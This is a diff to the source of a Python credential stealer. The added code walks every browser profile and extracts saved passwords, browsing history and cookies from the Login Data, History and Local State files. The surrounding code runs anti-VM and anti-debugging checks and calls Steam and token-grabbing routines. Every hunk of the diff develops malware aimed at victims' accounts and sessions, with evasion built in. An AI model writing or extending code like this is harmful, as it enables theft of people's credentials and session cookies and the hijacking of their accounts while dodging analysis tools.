@@ -19,6 +19,23 @@ class Main:
         antivm.AntiDebug.checks()
         
     def browser(self):
+        for key in extractor.browsers_profile:
+            browser = extractor.browsers[key]
+
+            if os.path.exists(browser):
+                profiles = ["Default"]
+
+                for file in os.listdir(browser):
+                    if file.lower().startswith("profile"):
+                        profiles.append(file)
+                
+                for profile in profiles:
+                    extraction = extractor.Extract(os.path.join(browser, profile, "Local State"))
+                    passwds = extraction.extractPasswords(os.path.join(browser, profile, "Login Data"))
+                    history = extraction.extractHistory(os.path.join(browser, profile, "History"))
+                    cookies = extraction.extractCookies(os.path.join(browser, profile))
+                    
+
         for key in extractor.browsers:
             browser = extractor.browsers[key]
 
@@ -27,7 +44,6 @@ class Main:
                 passwds = extraction.extractPasswords(os.path.join(browser, "Login Data"))
                 history = extraction.extractHistory(os.path.join(browser, "History"))
                 cookies = extraction.extractCookies(os.path.join(browser))
-                print(cookies)
 
 
     def steam(self):
@@ -43,13 +59,10 @@ class Main:
         antivm.Antidbg.proc_check()
         antivm.Antidbg.dll_check()
 
-        t1 = Thread(target=antivm.Antidbg.process_check)
-        t1.start()
+        antivm.Antidbg.process_check()
 
         self.browser()
         self.token()
-
-        sys.exit()
 
 if __name__ == "__main__":
     Main().run()
